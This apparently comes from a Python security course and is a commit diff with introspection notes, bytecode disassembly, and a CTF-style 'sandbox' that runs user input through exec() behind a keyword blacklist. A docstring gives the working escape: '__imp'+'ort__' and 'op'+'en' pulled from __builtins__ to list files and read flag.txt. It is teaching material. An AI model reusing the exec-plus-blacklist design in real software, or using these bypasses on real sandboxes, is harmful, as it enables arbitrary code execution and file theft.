d8834f24bb2094cd74758ec7006b6afe1ada4ad8
headshoter1 <pavelmochalov@bk.ru>
2022-03-05 14:38:33 -0500

    simple and hard sandboxes

--- Lesson9/Lesson9_3.py
+++ Lesson9/Lesson9_3.py
@@ -4,9 +4,56 @@ class Point:
         self.y = y
 
     def get_length(self):
-        return (self.x**2 + self.y**2) ** 0.5
+        return (self.x ** 2 + self.y ** 2) ** 0.5
 
     def set_coord(self, x, y):
         self.x = x
         self.y = y
 
+
+"""
+>>> import Lesson9_3
+>>> Lesson9_3.Point(12,15)
+<Lesson9_3.Point object at 0x7f47d0c15a90>
+>>> p = Lesson9_3.Point(12,15)
+>>> p.get_length()
+19.209372712298546
+>>> dir(p)
+['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'get_length', 'set_coord', 'x', 'y']
+>>> getattr(p, "set_coord")(1,2)
+>>> getattr(p, "get_length")()
+2.23606797749979
+"""
+
+
+def some_check(s):
+    if s == "asdfasdfasd":
+        return True
+    return False
+
+"""
+>>> Lesson9_3.some_check("asdfasd")
+False
+>>> dir(Lesson9_3.some_check)
+['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
+>>> print(Lesson9_3.some_check.__code__)
+<code object some_check at 0x7f03cb5469d0, file "/home/kali/PycharmProjects/pythonProject1/Lesson9/Lesson9_3.py", line 29>
+>>> print(Lesson9_3.some_check.__code__.co_code)
+bite-code
+>>> import dis
+>>> dis.dis(Lesson9_3.some_check.__code__.co_code)
+          0 LOAD_FAST                0 (0)
+          2 LOAD_CONST               1 (1)
+          4 COMPARE_OP               2 (==)
+          6 POP_JUMP_IF_FALSE       12
+          8 LOAD_CONST               2 (2)
+         10 RETURN_VALUE
+    >>   12 LOAD_CONST               3 (3)
+         14 RETURN_VALUE
+>>> print(Lesson9_3.some_check.__code__.co_consts)
+(None, 'asdfasdfasd', True, False)
+>>> print(Lesson9_3.some_check.__code__.co_filename)
+/home/kali/PycharmProjects/pythonProject1/Lesson9/Lesson9_3.py
+>>> print(Lesson9_3.some_check.__code__.co_varnames)
+('s',)
+"""
---
+++ Lesson9/simple_sandbox.py
@@ -0,0 +1,67 @@
+#!/usr/bin/env python3
+# -*- coding:utf-8 -*-
+"""
+simple sandbox escape example.
+"""
+
+
+def main():
+    text = input('>>> ')
+    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess']:
+        if keyword in text:
+            print('No!!!')
+            print(f'{keyword} is banned!')
+            return
+    else:
+        # exec(text, {"__builtins__": {}}, {})
+        exec(text)
+        return
+
+
+GREEN = '\033[92m'
+WARNING = '\033[93m'
+ERROR = '\033[91m'
+ENDC = '\033[0m'
+if __name__ == '__main__':
+    print(
+        f'{WARNING}Привет! Жестокие люди из HackerU посадили тебя в песочницу с питоном\nтебя выпустят из песочницы, если ты сдашь флаг!\nтебе еще повезло: вот код программы:{ENDC}')
+    print('-' * 200)
+    print(open(__file__).read(1063))
+    print('-' * 200)
+    print('вводи свои догадки:')
+    while 1:
+        try:
+            main()
+        except Exception as e:
+            print(f"Ой! что-то сломалось!\n{ERROR}{e}{ENDC}")
+
+
+"""
+__builtins__
+{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <bound method ImportHookManager.do_import of <module '_pydev_bundle.pydev_import_hook.import_hook'>>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation.
+All Rights Reserved.
+Copyright (c) 2000 BeOpen.com.
+All Rights Reserved.
+Copyright (c) 1995-2001 Corporation for National Research Initiatives.
+All Rights Reserved.
+Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
+All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
+for supporting Python development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object., 'execfile': <function execfile at 0x7f4cc6310550>, 'runfile': <function runfile at 0x7f4cc5f853a0>, '_': None}
+"""
+
+"""
+>>> __builtins__.__dict__["__import__"]("os")
+<module 'os' from '/usr/lib/python3.9/os.py'>
+
+>>> __builtins__.__dict__["print"]("aaa")                
+aaa
+
+>>> print(getattr(__builtins__.__dict__["__imp" + "ort__"]("o" + "s"), "listdir")())
+['__pycache__', 'secret.txt', 'ftp_client.py', 'Lesson9_3.py', 'Lesson9_1.py', 'Lesson9_2.py', 'passwd', 'simple_sandbox.py', 'flag.txt']
+
+>>> print(getattr(__builtins__.__dict__["op" + "en"]("flag.txt"), "re" + "ad")())
+FLAG!!!!
+
+"""
+
+print(open("flag.txt"))
